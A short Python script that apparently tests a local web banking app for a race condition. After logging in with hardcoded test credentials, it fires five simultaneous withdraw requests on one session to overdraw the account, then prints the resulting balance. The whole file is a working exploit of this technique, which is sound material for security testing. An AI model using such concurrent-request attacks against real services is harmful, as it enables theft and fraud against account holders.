import requests
import threading
import time

port = "5155"
url = f"http://localhost:{port}"

class withdrawThread (threading.Thread):
    def __init__(self, threadID, s):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.s = s
    def run(self):
        withdraw(self.s, 1000)

def withdraw(s, amt):
    r = s.get(url + f"/account/withdraw?amount={amt}")

s = requests.Session()

r = s.get(url + "/login?username=user1&password=password1")

threads = []
for i in range(5):
    threads.append(withdrawThread(i, s))

for i in threads:
    i.start()

time.sleep(5)

r = s.get(url + "/account")
print(r.text)